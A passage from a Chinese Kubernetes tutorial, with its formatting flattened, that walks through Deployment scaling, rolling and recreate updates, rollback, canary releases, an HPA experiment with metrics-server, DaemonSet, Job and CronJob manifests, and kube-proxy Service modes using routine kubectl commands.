107spc-deployment-6696798b78-wvjd8 1/1 Running 0 107s 扩缩容 1234567891011121314151617181920212223242526272829# 变更副本数量为5个[root@k8s-master01 ~]# kubectl scale deploy pc-deployment --replicas=5 -n devdeployment.apps/pc-deployment scaled# 查看deployment[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n devNAME READY UP-TO-DATE AVAILABLE AGEpc-deployment 5/5 5 5 2m# 查看pod[root@k8s-master01 ~]# kubectl get pods -n devNAME READY STATUS RESTARTS AGEpc-deployment-6696798b78-d2c8n 1/1 Running 0 4m19spc-deployment-6696798b78-jxmdq 1/1 Running 0 94spc-deployment-6696798b78-mktqv 1/1 Running 0 93spc-deployment-6696798b78-smpvp 1/1 Running 0 4m19spc-deployment-6696798b78-wvjd8 1/1 Running 0 4m19s# 编辑deployment的副本数量，修改spec:replicas: 4即可[root@k8s-master01 ~]# kubectl edit deploy pc-deployment -n devdeployment.apps/pc-deployment edited# 查看pod[root@k8s-master01 ~]# kubectl get pods -n devNAME READY STATUS RESTARTS AGEpc-deployment-6696798b78-d2c8n 1/1 Running 0 5m23spc-deployment-6696798b78-jxmdq 1/1 Running 0 2m38spc-deployment-6696798b78-smpvp 1/1 Running 0 5m23spc-deployment-6696798b78-wvjd8 1/1 Running 0 5m23s 镜像更新 deployment支持两种更新策略:重建更新和滚动更新,可以通过strategy指定策略类型,支持两个属性: 1234567strategy：指定新的Pod替换旧的Pod的策略， 支持两个属性： type：指定策略类型，支持两种策略 Recreate：在创建出新的Pod之前会先杀掉所有已存在的Pod RollingUpdate：滚动更新，就是杀死一部分，就启动一部分，在更新过程中，存在两个版本Pod rollingUpdate：当type为RollingUpdate时生效，用于为RollingUpdate设置参数，支持两个属性： maxUnavailable：用来指定在升级过程中不可用Pod的最大数量，默认为25%。 maxSurge： 用来指定在升级过程中可以超过期望的Pod的最大数量，默认为25%。 重建更新 编辑pc-deployment.yaml,在spec节点下添加更新策略 123spec: strategy: # 策略 type: Recreate # 重建更新 创建deploy进行验证 1234567891011121314151617181920212223242526# 变更镜像[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.2 -n devdeployment.apps/pc-deployment image updated# 观察升级过程[root@k8s-master01 ~]# kubectl get pods -n dev -wNAME READY STATUS RESTARTS AGEpc-deployment-5d89bdfbf9-65qcw 1/1 Running 0 31spc-deployment-5d89bdfbf9-w5nzv 1/1 Running 0 31spc-deployment-5d89bdfbf9-xpt7w 1/1 Running 0 31spc-deployment-5d89bdfbf9-xpt7w 1/1 Terminating 0 41spc-deployment-5d89bdfbf9-65qcw 1/1 Terminating 0 41spc-deployment-5d89bdfbf9-w5nzv 1/1 Terminating 0 41spc-deployment-675d469f8b-grn8z 0/1 Pending 0 0spc-deployment-675d469f8b-hbl4v 0/1 Pending 0 0spc-deployment-675d469f8b-67nz2 0/1 Pending 0 0spc-deployment-675d469f8b-grn8z 0/1 ContainerCreating 0 0spc-deployment-675d469f8b-hbl4v 0/1 ContainerCreating 0 0spc-deployment-675d469f8b-67nz2 0/1 ContainerCreating 0 0spc-deployment-675d469f8b-grn8z 1/1 Running 0 1spc-deployment-675d469f8b-67nz2 1/1 Running 0 1spc-deployment-675d469f8b-hbl4v 1/1 Running 0 2s 滚动更新 编辑pc-deployment.yaml,在spec节点下添加更新策略 123456spec: strategy: # 策略 type: RollingUpdate # 滚动更新策略 rollingUpdate: maxSurge: 25% maxUnavailable: 25% 创建deploy进行验证 12345678910111213141516171819202122232425262728293031323334# 变更镜像[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.3 -n dev deployment.apps/pc-deployment image updated# 观察升级过程[root@k8s-master01 ~]# kubectl get pods -n dev -wNAME READY STATUS RESTARTS AGEpc-deployment-c848d767-8rbzt 1/1 Running 0 31mpc-deployment-c848d767-h4p68 1/1 Running 0 31mpc-deployment-c848d767-hlmz4 1/1 Running 0 31mpc-deployment-c848d767-rrqcn 1/1 Running 0 31mpc-deployment-966bf7f44-226rx 0/1 Pending 0 0spc-deployment-966bf7f44-226rx 0/1 ContainerCreating 0 0spc-deployment-966bf7f44-226rx 1/1 Running 0 1spc-deployment-c848d767-h4p68 0/1 Terminating 0 34mpc-deployment-966bf7f44-cnd44 0/1 Pending 0 0spc-deployment-966bf7f44-cnd44 0/1 ContainerCreating 0 0spc-deployment-966bf7f44-cnd44 1/1 Running 0 2spc-deployment-c848d767-hlmz4 0/1 Terminating 0 34mpc-deployment-966bf7f44-px48p 0/1 Pending 0 0spc-deployment-966bf7f44-px48p 0/1 ContainerCreating 0 0spc-deployment-966bf7f44-px48p 1/1 Running 0 0spc-deployment-c848d767-8rbzt 0/1 Terminating 0 34mpc-deployment-966bf7f44-dkmqp 0/1 Pending 0 0spc-deployment-966bf7f44-dkmqp 0/1 ContainerCreating 0 0spc-deployment-966bf7f44-dkmqp 1/1 Running 0 2spc-deployment-c848d767-rrqcn 0/1 Terminating 0 34m# 至此，新版本的pod创建完毕，就版本的pod销毁完毕# 中间过程是滚动进行的，也就是边销毁边创建 滚动更新的过程： 镜像更新中rs的变化 1234567# 查看rs,发现原来的rs的依旧存在，只是pod数量变为了0，而后又新产生了一个rs，pod数量为4# 其实这就是deployment能够进行版本回退的奥妙所在，后面会详细解释[root@k8s-master01 ~]# kubectl get rs -n devNAME DESIRED CURRENT READY AGEpc-deployment-6696798b78 0 0 0 7m37spc-deployment-6696798b11 0 0 0 5m37spc-deployment-c848d76789 4 4 4 72s 版本回退 deployment支持版本升级过程中的暂停、继续功能以及版本回退等诸多功能，下面具体来看. kubectl rollout： 版本升级相关功能，支持下面的选项： status 显示当前升级状态 history 显示 升级历史记录 pause 暂停版本升级过程 resume 继续已经暂停的版本升级过程 restart 重启版本升级过程 undo 回滚到上一级版本（可以使用–to-revision回滚到指定版本） 12345678910111213141516171819202122232425262728293031# 查看当前升级版本的状态[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n devdeployment &quot;pc-deployment&quot; successfully rolled out# 查看升级历史记录[root@k8s-master01 ~]# kubectl rollout history deploy pc-deployment -n devdeployment.apps/pc-deploymentREVISION CHANGE-CAUSE1 kubectl create --filename=pc-deployment.yaml --record=true2 kubectl create --filename=pc-deployment.yaml --record=true3 kubectl create --filename=pc-deployment.yaml --record=true# 可以发现有三次版本记录，说明完成过两次升级# 版本回滚# 这里直接使用--to-revision=1回滚到了1版本， 如果省略这个选项，就是回退到上个版本，就是2版本[root@k8s-master01 ~]# kubectl rollout undo deployment pc-deployment --to-revision=1 -n devdeployment.apps/pc-deployment rolled back# 查看发现，通过nginx镜像版本可以发现到了第一版[root@k8s-master01 ~]# kubectl get deploy -n dev -o wideNAME READY UP-TO-DATE AVAILABLE AGE CONTAINERS IMAGES pc-deployment 4/4 4 4 74m nginx nginx:1.17.1 # 查看rs，发现第一个rs中有4个pod运行，后面两个版本的rs中pod为运行# 其实deployment之所以可是实现版本的回滚，就是通过记录下历史rs来实现的，# 一旦想回滚到哪个版本，只需要将当前版本pod数量降为0，然后将回滚版本的pod提升为目标数量就可以了[root@k8s-master01 ~]# kubectl get rs -n devNAME DESIRED CURRENT READY AGEpc-deployment-6696798b78 4 4 4 78mpc-deployment-966bf7f44 0 0 0 37mpc-deployment-c848d767 0 0 0 71m 金丝雀发布 Deployment控制器支持控制更新过程中的控制，如“暂停(pause)”或“继续(resume)”更新操作。 比如有一批新的Pod资源创建完成后立即暂停更新过程，此时，仅存在一部分新版本的应用，主体部分还是旧的版本。然后，再筛选一小部分的用户请求路由到新版本的Pod应用，继续观察能否稳定地按期望的方式运行。确定没问题之后再继续完成余下的Pod资源滚动更新，否则立即回滚更新操作。这就是所谓的金丝雀发布。 1234567891011121314151617181920212223242526272829303132333435363738394041# 更新deployment的版本，并配置暂停deployment[root@k8s-master01 ~]# kubectl set image deploy pc-deployment nginx=nginx:1.17.4 -n dev &amp;&amp; kubectl rollout pause deployment pc-deployment -n devdeployment.apps/pc-deployment image updateddeployment.apps/pc-deployment paused#观察更新状态[root@k8s-master01 ~]# kubectl rollout status deploy pc-deployment -n dev Waiting for deployment &quot;pc-deployment&quot; rollout to finish: 2 out of 4 new replicas have been updated...# 监控更新的过程，可以看到已经新增了一个资源，但是并未按照预期的状态去删除一个旧的资源，就是因为使用了pause暂停命令[root@k8s-master01 ~]# kubectl get rs -n dev -o wideNAME DESIRED CURRENT READY AGE CONTAINERS IMAGES pc-deployment-5d89bdfbf9 3 3 3 19m nginx nginx:1.17.1 pc-deployment-675d469f8b 0 0 0 14m nginx nginx:1.17.2 pc-deployment-6c9f56fcfb 2 2 2 3m16s nginx nginx:1.17.4 [root@k8s-master01 ~]# kubectl get pods -n devNAME READY STATUS RESTARTS AGEpc-deployment-5d89bdfbf9-rj8sq 1/1 Running 0 7m33spc-deployment-5d89bdfbf9-ttwgg 1/1 Running 0 7m35spc-deployment-5d89bdfbf9-v4wvc 1/1 Running 0 7m34spc-deployment-6c9f56fcfb-996rt 1/1 Running 0 3m31spc-deployment-6c9f56fcfb-j2gtj 1/1 Running 0 3m31s# 确保更新的pod没问题了，继续更新[root@k8s-master01 ~]# kubectl rollout resume deploy pc-deployment -n devdeployment.apps/pc-deployment resumed# 查看最后的更新情况[root@k8s-master01 ~]# kubectl get rs -n dev -o wideNAME DESIRED CURRENT READY AGE CONTAINERS IMAGES pc-deployment-5d89bdfbf9 0 0 0 21m nginx nginx:1.17.1 pc-deployment-675d469f8b 0 0 0 16m nginx nginx:1.17.2 pc-deployment-6c9f56fcfb 4 4 4 5m11s nginx nginx:1.17.4 [root@k8s-master01 ~]# kubectl get pods -n devNAME READY STATUS RESTARTS AGEpc-deployment-6c9f56fcfb-7bfwh 1/1 Running 0 37spc-deployment-6c9f56fcfb-996rt 1/1 Running 0 5m27spc-deployment-6c9f56fcfb-j2gtj 1/1 Running 0 5m27spc-deployment-6c9f56fcfb-rf84v 1/1 Running 0 37s 删除Deployment 123# 删除deployment，其下的rs和pod也将被删除[root@k8s-master01 ~]# kubectl delete -f pc-deployment.yamldeployment.apps &quot;pc-deployment&quot; deleted Horizontal Pod Autoscaler(HPA)在前面的课程中，我们已经可以实现通过手工执行kubectl scale命令实现Pod扩容或缩容，但是这显然不符合Kubernetes的定位目标–自动化、智能化。 Kubernetes期望可以实现通过监测Pod的使用情况，实现pod数量的自动调整，于是就产生了Horizontal Pod Autoscaler（HPA）这种控制器。 HPA可以获取每个Pod利用率，然后和HPA中定义的指标进行对比，同时计算出需要伸缩的具体值，最后实现Pod的数量的调整。其实HPA与之前的Deployment一样，也属于一种Kubernetes资源对象，它通过追踪分析RC控制的所有目标Pod的负载变化情况，来确定是否需要针对性地调整目标Pod的副本数，这是HPA的实现原理。 接下来，我们来做一个实验 1 安装metrics-server metrics-server可以用来收集集群中的资源使用情况 12345678910111213# 安装git[root@k8s-master01 ~]# yum install git -y# 获取metrics-server, 注意使用的版本[root@k8s-master01 ~]# git clone -b v0.3.6 https://github.com/kubernetes-incubator/metrics-server# 修改deployment, 注意修改的是镜像和初始化参数[root@k8s-master01 ~]# cd /root/metrics-server/deploy/1.8+/[root@k8s-master01 1.8+]# vim metrics-server-deployment.yaml按图中添加下面选项hostNetwork: trueimage: registry.cn-hangzhou.aliyuncs.com/google_containers/metrics-server-amd64:v0.3.6args:- --kubelet-insecure-tls- --kubelet-preferred-address-types=InternalIP,Hostname,InternalDNS,ExternalDNS,ExternalIP 1234567891011121314151617181920# 安装metrics-server[root@k8s-master01 1.8+]# kubectl apply -f ./# 查看pod运行情况[root@k8s-master01 1.8+]# kubectl get pod -n kube-systemmetrics-server-6b976979db-2xwbj 1/1 Running 0 90s# 使用kubectl top node 查看资源使用情况[root@k8s-master01 1.8+]# kubectl top nodeNAME CPU(cores) CPU% MEMORY(bytes) MEMORY%k8s-master01 289m 14% 1582Mi 54% k8s-node01 81m 4% 1195Mi 40% k8s-node02 72m 3% 1211Mi 41% [root@k8s-master01 1.8+]# kubectl top pod -n kube-systemNAME CPU(cores) MEMORY(bytes)coredns-6955765f44-7ptsb 3m 9Micoredns-6955765f44-vcwr5 3m 8Mietcd-master 14m 145Mi...# 至此,metrics-server安装完成 2 准备deployment和servie 创建pc-hpa-pod.yaml文件，内容如下： 12345678910111213141516171819202122232425apiVersion: apps/v1kind: Deploymentmetadata: name: nginx namespace: devspec: strategy: # 策略 type: RollingUpdate # 滚动更新策略 replicas: 1 selector: matchLabels: app: nginx-pod template: metadata: labels: app: nginx-pod spec: containers: - name: nginx image: nginx:1.17.1 resources: # 资源配额 limits: # 限制资源（上限） cpu: &quot;1&quot; # CPU限制，单位是core数 requests: # 请求资源（下限） cpu: &quot;100m&quot; # CPU限制，单位是core数 12# 创建service[root@k8s-master01 1.8+]# kubectl expose deployment nginx --type=NodePort --port=80 -n dev 12345678910# 查看[root@k8s-master01 1.8+]# kubectl get deployment,pod,svc -n devNAME READY UP-TO-DATE AVAILABLE AGEdeployment.apps/nginx 1/1 1 1 47sNAME READY STATUS RESTARTS AGEpod/nginx-7df9756ccc-bh8dr 1/1 Running 0 47sNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEservice/nginx NodePort 10.101.18.29 &lt;none&gt; 80:31830/TCP 35s 3 部署HPA 创建pc-hpa.yaml文件，内容如下： 12345678910111213apiVersion: autoscaling/v1kind: HorizontalPodAutoscalermetadata: name: pc-hpa namespace: devspec: minReplicas: 1 #最小pod数量 maxReplicas: 10 #最大pod数量 targetCPUUtilizationPercentage: 3 # CPU使用率指标 scaleTargetRef: # 指定要控制的nginx信息 apiVersion: apps/v1 kind: Deployment name: nginx 12345678# 创建hpa[root@k8s-master01 1.8+]# kubectl create -f pc-hpa.yamlhorizontalpodautoscaler.autoscaling/pc-hpa created# 查看hpa [root@k8s-master01 1.8+]# kubectl get hpa -n devNAME REFERENCE TARGETS MINPODS MAXPODS REPLICAS AGEpc-hpa Deployment/nginx 0%/3% 1 10 1 62s 4 测试 使用压测工具对service地址192.168.5.4:31830进行压测，然后通过控制台查看hpa和pod的变化 hpa变化 1234567891011[root@k8s-master01 ~]# kubectl get hpa -n dev -wNAME REFERENCE TARGETS MINPODS MAXPODS REPLICAS AGEpc-hpa Deployment/nginx 0%/3% 1 10 1 4m11spc-hpa Deployment/nginx 0%/3% 1 10 1 5m19spc-hpa Deployment/nginx 22%/3% 1 10 1 6m50spc-hpa Deployment/nginx 22%/3% 1 10 4 7m5spc-hpa Deployment/nginx 22%/3% 1 10 8 7m21spc-hpa Deployment/nginx 6%/3% 1 10 8 7m51spc-hpa Deployment/nginx 0%/3% 1 10 8 9m6spc-hpa Deployment/nginx 0%/3% 1 10 8 13mpc-hpa Deployment/nginx 0%/3% 1 10 1 14m deployment变化 123456789101112131415161718192021[root@k8s-master01 ~]# kubectl get deployment -n dev -wNAME READY UP-TO-DATE AVAILABLE AGEnginx 1/1 1 1 11mnginx 1/4 1 1 13mnginx 1/4 1 1 13mnginx 1/4 1 1 13mnginx 1/4 4 1 13mnginx 1/8 4 1 14mnginx 1/8 4 1 14mnginx 1/8 4 1 14mnginx 1/8 8 1 14mnginx 2/8 8 2 14mnginx 3/8 8 3 14mnginx 4/8 8 4 14mnginx 5/8 8 5 14mnginx 6/8 8 6 14mnginx 7/8 8 7 14mnginx 8/8 8 8 15mnginx 8/1 8 8 20mnginx 8/1 8 8 20mnginx 1/1 1 1 20m pod变化 12345678910111213141516171819202122232425262728293031[root@k8s-master01 ~]# kubectl get pods -n dev -wNAME READY STATUS RESTARTS AGEnginx-7df9756ccc-bh8dr 1/1 Running 0 11mnginx-7df9756ccc-cpgrv 0/1 Pending 0 0snginx-7df9756ccc-8zhwk 0/1 Pending 0 0snginx-7df9756ccc-rr9bn 0/1 Pending 0 0snginx-7df9756ccc-cpgrv 0/1 ContainerCreating 0 0snginx-7df9756ccc-8zhwk 0/1 ContainerCreating 0 0snginx-7df9756ccc-rr9bn 0/1 ContainerCreating 0 0snginx-7df9756ccc-m9gsj 0/1 Pending 0 0snginx-7df9756ccc-g56qb 0/1 Pending 0 0snginx-7df9756ccc-sl9c6 0/1 Pending 0 0snginx-7df9756ccc-fgst7 0/1 Pending 0 0snginx-7df9756ccc-g56qb 0/1 ContainerCreating 0 0snginx-7df9756ccc-m9gsj 0/1 ContainerCreating 0 0snginx-7df9756ccc-sl9c6 0/1 ContainerCreating 0 0snginx-7df9756ccc-fgst7 0/1 ContainerCreating 0 0snginx-7df9756ccc-8zhwk 1/1 Running 0 19snginx-7df9756ccc-rr9bn 1/1 Running 0 30snginx-7df9756ccc-m9gsj 1/1 Running 0 21snginx-7df9756ccc-cpgrv 1/1 Running 0 47snginx-7df9756ccc-sl9c6 1/1 Running 0 33snginx-7df9756ccc-g56qb 1/1 Running 0 48snginx-7df9756ccc-fgst7 1/1 Running 0 66snginx-7df9756ccc-fgst7 1/1 Terminating 0 6m50snginx-7df9756ccc-8zhwk 1/1 Terminating 0 7m5snginx-7df9756ccc-cpgrv 1/1 Terminating 0 7m5snginx-7df9756ccc-g56qb 1/1 Terminating 0 6m50snginx-7df9756ccc-rr9bn 1/1 Terminating 0 7m5snginx-7df9756ccc-m9gsj 1/1 Terminating 0 6m50snginx-7df9756ccc-sl9c6 1/1 Terminating 0 6m50s DaemonSet(DS)DaemonSet类型的控制器可以保证在集群中的每一台（或指定）节点上都运行一个副本。一般适用于日志收集、节点监控等场景。也就是说，如果一个Pod提供的功能是节点级别的（每个节点都需要且只需要一个），那么这类Pod就适合使用DaemonSet类型的控制器创建。 DaemonSet控制器的特点： 每当向集群中添加一个节点时，指定的 Pod 副本也将添加到该节点上 当节点从集群中移除时，Pod 也就被垃圾回收了 下面先来看下DaemonSet的资源清单文件 12345678910111213141516171819202122232425262728apiVersion: apps/v1 # 版本号kind: DaemonSet # 类型 metadata: # 元数据 name: # rs名称 namespace: # 所属命名空间 labels: #标签 controller: daemonsetspec: # 详情描述 revisionHistoryLimit: 3 # 保留历史版本 updateStrategy: # 更新策略 type: RollingUpdate # 滚动更新策略 rollingUpdate: # 滚动更新 maxUnavailable: 1 # 最大不可用状态的 Pod 的最大值，可以为百分比，也可以为整数 selector: # 选择器，通过它指定该控制器管理哪些pod matchLabels: # Labels匹配规则 app: nginx-pod matchExpressions: # Expressions匹配规则 - {key: app, operator: In, values: [nginx-pod]} template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本 metadata: labels: app: nginx-pod spec: containers: - name: nginx image: nginx:1.17.1 ports: - containerPort: 80 创建pc-daemonset.yaml，内容如下： 1234567891011121314151617apiVersion: apps/v1kind: DaemonSet metadata: name: pc-daemonset namespace: devspec: selector: matchLabels: app: nginx-pod template: metadata: labels: app: nginx-pod spec: containers: - name: nginx image: nginx:1.17.1 123456789101112131415161718# 创建daemonset[root@k8s-master01 ~]# kubectl create -f pc-daemonset.yamldaemonset.apps/pc-daemonset created# 查看daemonset[root@k8s-master01 ~]# kubectl get ds -n dev -o wideNAME DESIRED CURRENT READY UP-TO-DATE AVAILABLE AGE CONTAINERS IMAGES pc-daemonset 2 2 2 2 2 24s nginx nginx:1.17.1 # 查看pod,发现在每个Node上都运行一个pod[root@k8s-master01 ~]# kubectl get pods -n dev -o wideNAME READY STATUS RESTARTS AGE IP NODE pc-daemonset-9bck8 1/1 Running 0 37s 10.244.1.43 node1 pc-daemonset-k224w 1/1 Running 0 37s 10.244.2.74 node2 # 删除daemonset[root@k8s-master01 ~]# kubectl delete -f pc-daemonset.yamldaemonset.apps &quot;pc-daemonset&quot; deleted JobJob，主要用于负责**批量处理(一次要处理指定数量任务)短暂的一次性(每个任务仅运行一次就结束)**任务。Job特点如下： 当Job创建的pod执行成功结束时，Job将记录成功结束的pod数量 当成功结束的pod达到指定的数量时，Job将完成执行 Job的资源清单文件： 12345678910111213141516171819202122232425262728apiVersion: batch/v1 # 版本号kind: Job # 类型 metadata: # 元数据 name: # rs名称 namespace: # 所属命名空间 labels: #标签 controller: jobspec: # 详情描述 completions: 1 # 指定job需要成功运行Pods的次数。默认值: 1 parallelism: 1 # 指定job在任一时刻应该并发运行Pods的数量。默认值: 1 activeDeadlineSeconds: 30 # 指定job可运行的时间期限，超过时间还未结束，系统将会尝试进行终止。 backoffLimit: 6 # 指定job失败后进行重试的次数。默认是6 manualSelector: true # 是否可以使用selector选择器选择pod，默认是false selector: # 选择器，通过它指定该控制器管理哪些pod matchLabels: # Labels匹配规则 app: counter-pod matchExpressions: # Expressions匹配规则 - {key: app, operator: In, values: [counter-pod]} template: # 模板，当副本数量不足时，会根据下面的模板创建pod副本 metadata: labels: app: counter-pod spec: restartPolicy: Never # 重启策略只能设置为Never或者OnFailure containers: - name: counter image: busybox:1.30 command: [&quot;bin/sh&quot;,&quot;-c&quot;,&quot;for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 2;done&quot;] 1234关于重启策略设置的说明： 如果指定为OnFailure，则job会在pod出现故障时重启容器，而不是创建pod，failed次数不变 如果指定为Never，则job会在pod出现故障时创建新的pod，并且故障pod不会消失，也不会重启，failed次数加1 如果指定为Always的话，就意味着一直重启，意味着job任务会重复去执行了，当然不对，所以不能设置为Always 创建pc-job.yaml，内容如下： 1234567891011121314151617181920apiVersion: batch/v1kind: Job metadata: name: pc-job namespace: devspec: manualSelector: true selector: matchLabels: app: counter-pod template: metadata: labels: app: counter-pod spec: restartPolicy: Never containers: - name: counter image: busybox:1.30 command: [&quot;bin/sh&quot;,&quot;-c&quot;,&quot;for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done&quot;] 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# 创建job[root@k8s-master01 ~]# kubectl create -f pc-job.yamljob.batch/pc-job created# 查看job[root@k8s-master01 ~]# kubectl get job -n dev -o wide -wNAME COMPLETIONS DURATION AGE CONTAINERS IMAGES SELECTORpc-job 0/1 21s 21s counter busybox:1.30 app=counter-podpc-job 1/1 31s 79s counter busybox:1.30 app=counter-pod# 通过观察pod状态可以看到，pod在运行完毕任务后，就会变成Completed状态[root@k8s-master01 ~]# kubectl get pods -n dev -wNAME READY STATUS RESTARTS AGEpc-job-rxg96 1/1 Running 0 29spc-job-rxg96 0/1 Completed 0 33s# 接下来，调整下pod运行的总数量和并行数量 即：在spec下设置下面两个选项# completions: 6 # 指定job需要成功运行Pods的次数为6# parallelism: 3 # 指定job并发运行Pods的数量为3# 然后重新运行job，观察效果，此时会发现，job会每次运行3个pod，总共执行了6个pod[root@k8s-master01 ~]# kubectl get pods -n dev -wNAME READY STATUS RESTARTS AGEpc-job-684ft 1/1 Running 0 5spc-job-jhj49 1/1 Running 0 5spc-job-pfcvh 1/1 Running 0 5spc-job-684ft 0/1 Completed 0 11spc-job-v7rhr 0/1 Pending 0 0spc-job-v7rhr 0/1 Pending 0 0spc-job-v7rhr 0/1 ContainerCreating 0 0spc-job-jhj49 0/1 Completed 0 11spc-job-fhwf7 0/1 Pending 0 0spc-job-fhwf7 0/1 Pending 0 0spc-job-pfcvh 0/1 Completed 0 11spc-job-5vg2j 0/1 Pending 0 0spc-job-fhwf7 0/1 ContainerCreating 0 0spc-job-5vg2j 0/1 Pending 0 0spc-job-5vg2j 0/1 ContainerCreating 0 0spc-job-fhwf7 1/1 Running 0 2spc-job-v7rhr 1/1 Running 0 2spc-job-5vg2j 1/1 Running 0 3spc-job-fhwf7 0/1 Completed 0 12spc-job-v7rhr 0/1 Completed 0 12spc-job-5vg2j 0/1 Completed 0 12s# 删除job[root@k8s-master01 ~]# kubectl delete -f pc-job.yamljob.batch &quot;pc-job&quot; deleted CronJob(CJ)CronJob控制器以Job控制器资源为其管控对象，并借助它管理pod资源对象，Job控制器定义的作业任务在其控制器资源创建之后便会立即执行，但CronJob可以以类似于Linux操作系统的周期性任务作业计划的方式控制其运行时间点及重复运行的方式。也就是说，CronJob可以在特定的时间点(反复的)去运行job任务。 CronJob的资源清单文件： 123456789101112131415161718192021222324252627282930313233343536apiVersion: batch/v1beta1 # 版本号kind: CronJob # 类型 metadata: # 元数据 name: # rs名称 namespace: # 所属命名空间 labels: #标签 controller: cronjobspec: # 详情描述 schedule: # cron格式的作业调度运行时间点,用于控制任务在什么时间执行 concurrencyPolicy: # 并发执行策略，用于定义前一次作业运行尚未完成时是否以及如何运行后一次的作业 failedJobHistoryLimit: # 为失败的任务执行保留的历史记录数，默认为1 successfulJobHistoryLimit: # 为成功的任务执行保留的历史记录数，默认为3 startingDeadlineSeconds: # 启动作业错误的超时时长 jobTemplate: # job控制器模板，用于为cronjob控制器生成job对象;下面其实就是job的定义 metadata: spec: completions: 1 parallelism: 1 activeDeadlineSeconds: 30 backoffLimit: 6 manualSelector: true selector: matchLabels: app: counter-pod matchExpressions: 规则 - {key: app, operator: In, values: [counter-pod]} template: metadata: labels: app: counter-pod spec: restartPolicy: Never containers: - name: counter image: busybox:1.30 command: [&quot;bin/sh&quot;,&quot;-c&quot;,&quot;for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 20;done&quot;] 123456789101112131415需要重点解释的几个选项：schedule: cron表达式，用于指定任务的执行时间 */1 * * * * &lt;分钟&gt; &lt;小时&gt; &lt;日&gt; &lt;月份&gt; &lt;星期&gt; 分钟 值从 0 到 59. 小时 值从 0 到 23. 日 值从 1 到 31. 月 值从 1 到 12. 星期 值从 0 到 6, 0 代表星期日 多个时间可以用逗号隔开； 范围可以用连字符给出；*可以作为通配符； /表示每...concurrencyPolicy: Allow: 允许Jobs并发运行(默认) Forbid: 禁止并发运行，如果上一次运行尚未完成，则跳过下一次运行 Replace: 替换，取消当前正在运行的作业并用新作业替换它 创建pc-cronjob.yaml，内容如下： 12345678910111213141516171819apiVersion: batch/v1beta1kind: CronJobmetadata: name: pc-cronjob namespace: dev labels: controller: cronjobspec: schedule: &quot;*/1 * * * *&quot; jobTemplate: metadata: spec: template: spec: restartPolicy: Never containers: - name: counter image: busybox:1.30 command: [&quot;bin/sh&quot;,&quot;-c&quot;,&quot;for i in 9 8 7 6 5 4 3 2 1; do echo $i;sleep 3;done&quot;] 1234567891011121314151617181920212223242526# 创建cronjob[root@k8s-master01 ~]# kubectl create -f pc-cronjob.yamlcronjob.batch/pc-cronjob created# 查看cronjob[root@k8s-master01 ~]# kubectl get cronjobs -n devNAME SCHEDULE SUSPEND ACTIVE LAST SCHEDULE AGEpc-cronjob */1 * * * * False 0 &lt;none&gt; 6s# 查看job[root@k8s-master01 ~]# kubectl get jobs -n devNAME COMPLETIONS DURATION AGEpc-cronjob-1592587800 1/1 28s 3m26spc-cronjob-1592587860 1/1 28s 2m26spc-cronjob-1592587920 1/1 28s 86s# 查看pod[root@k8s-master01 ~]# kubectl get pods -n devpc-cronjob-1592587800-x4tsm 0/1 Completed 0 2m24spc-cronjob-1592587860-r5gv4 0/1 Completed 0 84spc-cronjob-1592587920-9dxxq 1/1 Running 0 24s# 删除cronjob[root@k8s-master01 ~]# kubectl delete -f pc-cronjob.yamlcronjob.batch &quot;pc-cronjob&quot; deleted Service详解Service介绍在kubernetes中，pod是应用程序的载体，我们可以通过pod的ip来访问应用程序，但是pod的ip地址不是固定的，这也就意味着不方便直接采用pod的ip对服务进行访问。 为了解决这个问题，kubernetes提供了Service资源，Service会对提供同一个服务的多个pod进行聚合，并且提供一个统一的入口地址。通过访问Service的入口地址就能访问到后面的pod服务。 Service在很多情况下只是一个概念，真正起作用的其实是kube-proxy服务进程，每个Node节点上都运行着一个kube-proxy服务进程。当创建Service的时候会通过api-server向etcd写入创建的service的信息，而kube-proxy会基于监听的机制发现这种Service的变动，然后它会将最新的Service信息转换成对应的访问规则。 123456789101112# 10.97.97.97:80 是service提供的访问入口# 当访问这个入口的时候，可以发现后面有三个pod的服务在等待调用，# kube-proxy会基于rr（轮询）的策略，将请求分发到其中一个pod上去# 这个规则会同时在集群内的所有节点上都生成，所以在任何一个节点上访问都可以。[root@node1 ~]# ipvsadm -LnIP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port Scheduler Flags -&gt; RemoteAddress:Port Forward Weight ActiveConn InActConnTCP 10.97.97.97:80 rr -&gt; 10.244.1.39:80 Masq 1 0 0 -&gt; 10.244.1.40:80 Masq 1 0 0 -&gt; 10.244.2.33:80 Masq 1 0 0 kube-proxy目前支持三种工作模式: userspace 模式 userspace模式下，kube-proxy会为每一个Service创建一个监听端口，发向Cluster IP的请求被Iptables规则重定向到kube-proxy监听的端口上，kube-proxy根据LB算法选择一个提供服务的Pod并和其建立链接，以将请求转发到Pod上。 该模式下，kube-proxy充当了一个四层负责均衡器的角色。由于kube-proxy运行在userspace中，在进行转发处理时会增加内核和用户空间之间的数据拷贝，虽然比较稳定，但是效率比较低。 iptables 模式 iptables模式下，kube-proxy为service后端的每个Pod创建对应的iptables规则，直接将发向Cluster IP的请求重定向到一个Pod IP。 该模式下kube-proxy不承担四层负责均衡器的角色，只负责创建iptables规则。该模式的优点是较userspace模式效率更高，但不能提供灵活的LB策略，当后端Pod不可用时也无法进行重试。 ipvs 模式 ipvs模式和iptables类似，kube-proxy监控Pod的变化并创建相应的ipvs规则。ipvs相对iptables转发效率更高。除此以外，ipvs支持更多的LB算法。 12345678910111213# 此模式必须安装ipvs内核模块，否则会降级为iptables# 开启ipvs[root@k8s-master01 ~]# kubectl edit cm kube-proxy -n kube-system# 修改mode: &quot;ipvs&quot;[root@k8s-master01 ~]# kubectl delete pod -l k8s-app=kube-proxy -n kube-system[root@node1 ~]# ipvsadm -LnIP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port Scheduler Flags -&gt; RemoteAddress:Port Forward Weight ActiveConn InActConnTCP 10.97.97.97:80 rr -&gt; 10.244.1.39:80 Masq 1 0 0 -&gt; 10.244.1.40:80 Masq 1 0 0 -&gt; 10.244.2.33:80 